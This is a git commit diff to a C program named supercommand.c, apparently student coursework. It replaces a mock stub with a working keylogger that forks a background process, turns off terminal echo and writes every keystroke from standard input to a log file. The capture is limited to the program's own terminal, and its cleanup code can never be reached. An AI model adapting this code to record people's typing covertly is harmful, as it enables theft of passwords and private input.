50a22893ea0658e8cd77a84f26f0f1dc608fd100
IAN NATHANIEL PUANG YI XUAN <78036@siswa.unimas.my>
2025-01-02 11:24:30 +0800

    final supercommand.c

--- supercommand.c
+++ supercommand.c
@@ -7,6 +7,7 @@
 #include <sys/stat.h>
 #include <dirent.h>
 #include <time.h>
+#include <termios.h>
 
 // Function declarations
 void menu_system();
@@ -192,9 +193,39 @@ void directory_operations(int mode, char *arg1) {
 
 // Keylogger operations
 void keylogger_operations(char *logfile) {
-    printf("Keylogger started (mock implementation).\n");
-    // Implementation for logging keystrokes to logfile will go here
-    // This requires more advanced handling and permissions
+    pid_t pid = fork();
+    if (pid == 0) { // Child process (keylogger)
+        int log_fd = open(logfile, O_CREAT | O_WRONLY | O_APPEND, 0644);
+        if (log_fd == -1) {
+            perror("Error opening log file");
+            exit(1);
+        }
+
+        // Write timestamp to log file
+        time_t t = time(NULL);
+        dprintf(log_fd, "Session started: %s\n", ctime(&t));
+
+        // Disable terminal echoing
+        struct termios oldt, newt;
+        tcgetattr(STDIN_FILENO, &oldt);
+        newt = oldt;
+        newt.c_lflag &= ~(ECHO | ICANON); // Disable echo and canonical mode
+        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+
+        char ch;
+        while (1) {
+            read(STDIN_FILENO, &ch, 1); // Capture keystrokes
+            if (ch == '\n') write(log_fd, "\n", 1);
+            else write(log_fd, &ch, 1);
+        }
+
+        // Restore terminal settings
+        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
+        close(log_fd);
+        exit(0);
+    } else {
+        printf("Keylogger is running in the background. Log file: %s\n", logfile);
+    }
 }
 
 // Print the menu
